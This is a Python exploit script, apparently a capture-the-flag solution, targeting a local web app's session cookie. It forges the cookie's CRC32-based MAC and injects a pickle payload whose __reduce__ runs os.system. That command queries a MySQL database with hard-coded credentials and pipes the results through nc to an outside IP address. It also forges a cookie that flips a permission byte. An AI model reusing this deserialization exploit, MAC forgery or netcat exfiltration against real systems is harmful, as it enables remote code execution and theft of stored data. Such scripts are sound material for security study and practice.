import zlib
import json
import pickle
import requests
# 8004953e000000000000008c06776562617070948c04557365729493942981947d94288c08757365726e616d65948c0773646673646565948c0a7065726d697373696f6e948975622e-72a7bc0c
# MAC of ssss:

import pickle
import os

python_exploit = "import mysql.connector; conn = mysql.connector.connect(host='db', user='dbuser', password='123456', database='users'); cursor = conn.cursor(); cursor.execute('SELECT content FROM notes WHERE content LIKE \\'%CSR%\\''); print([x for x in cursor.fetchall()])"

connect_back_listener = "138.68.72.117"
connect_back_port = 1337

class Exploit:
    def __reduce__(self):
        return (os.system, ("""python -c "{}"|nc {} {}""".format(python_exploit, connect_back_listener, connect_back_port),))

exploit_payload = pickle.dumps(Exploit())

len_payload = len(exploit_payload)
len_user = len(b'\x80\x04\x95>\x00\x00\x00\x00\x00\x00\x00\x8c\x06webapp\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x08username\x94\x8c\x07\x94\x8c\npermission\x94\x88ub.')

diff_len = len_payload - len_user - 3 # -3 because length will be int (3 bytes more)

print(f"Need to register user with username len {diff_len}")

reg_user = os.urandom(diff_len).hex()[:diff_len]

sess = requests.Session()
sess.post("http://localhost:7717/register", data={"username": reg_user, "password": "abc"})
res = sess.post("http://localhost:7717/login", data={"username": reg_user, "password": "abc"})

user_cookie = sess.cookies["user"]

user_obj, mac = user_cookie.split("-")

src_crc = int(mac, 16)
user = bytes.fromhex(user_obj)

assert len(exploit_payload) == len(user), "Length doesnt match :("

def calc_crc(src, tar):
    diff_crc = zlib.crc32(src) ^ zlib.crc32(tar)
    new_crc = src_crc ^ diff_crc
    return new_crc

dance_party_user = bytearray(user)
dance_party_user[-4] = 0x88
dance_party_user = bytes(dance_party_user)

dance_crc = calc_crc(user, dance_party_user)
print("Dance party cookie: {}-{}".format(dance_party_user.hex(), hex(dance_crc)[2:]))

# Generate fake MAC
new_crc = calc_crc(user, exploit_payload)

cookie = "{}-{}".format(exploit_payload.hex(), hex(new_crc)[2:])

print(cookie)

res = requests.get("http://localhost:7717/notes", cookies={"user": cookie})
print(res.text)
